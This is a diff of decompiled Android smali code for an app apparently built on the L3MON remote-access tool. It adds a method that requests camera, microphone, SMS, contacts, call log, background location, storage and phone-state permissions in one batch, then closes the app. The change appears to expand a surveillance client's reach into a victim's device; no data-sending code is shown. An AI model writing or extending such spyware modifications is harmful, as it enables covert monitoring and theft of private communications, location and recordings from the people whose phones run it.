@@ -179,7 +179,7 @@
     :cond_0
     invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->requestBatteryOptimization()V
 
-    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->requestAllPermissions()V
 
     .line 49
     return-void
@@ -245,5 +245,77 @@
     invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
 
     :cond_0
+    return-void
+.end method
+
+.method private requestAllPermissions()V
+    .locals 3
+
+    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
+    const/16 v1, 0x17
+    if-lt v0, v1, :cond_0
+
+    const/16 v0, 0xb
+    new-array v0, v0, [Ljava/lang/String;
+
+    const/4 v1, 0x0
+    const-string v2, "android.permission.CAMERA"
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x1
+    const-string v2, "android.permission.READ_CONTACTS"
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x2
+    const-string v2, "android.permission.READ_SMS"
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x3
+    const-string v2, "android.permission.READ_CALL_LOG"
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x4
+    const-string v2, "android.permission.ACCESS_FINE_LOCATION"
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x5
+    const-string v2, "android.permission.RECORD_AUDIO"
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x6
+    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x7
+    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x8
+    const-string v2, "android.permission.ACCESS_BACKGROUND_LOCATION"
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x9
+    const-string v2, "android.permission.POST_NOTIFICATIONS"
+    aput-object v2, v0, v1
+
+    const/16 v1, 0xa
+    const-string v2, "android.permission.READ_PHONE_STATE"
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x539
+    invoke-virtual {p0, v0, v1}, Lcom/etechd/l3mon/MainActivity;->requestPermissions([Ljava/lang/String;I)V
+    goto :goto_0
+
+    :cond_0
+    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
+
+    :goto_0
+    return-void
+.end method
+
+.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
+    .locals 0
+
+    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
     return-void
 .end method
